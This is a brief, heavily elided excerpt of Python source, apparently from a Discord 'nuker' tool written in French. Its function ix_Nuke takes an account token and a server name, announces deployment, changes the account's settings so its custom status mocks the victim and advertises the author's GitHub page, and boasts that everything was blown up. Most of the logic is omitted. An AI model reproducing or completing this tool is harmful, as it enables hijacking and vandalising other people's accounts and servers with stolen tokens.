...
def ix_Nuke(token, Server_Name, message_Content):
    setTitle("Déploiement de ix")
    print(f"{Fore.RESET}[{Fore.RED}*{Fore.RESET}] {Fore.BLUE}ix déployé...")
    ...
    setting = {
          ...
          "custom_status": {"text": "je me suis fait niquez par https://github.com/ix666"},
          'status': "idle"
    }
    ...
    setTitle(f"ix a tout explosé avec succès!")
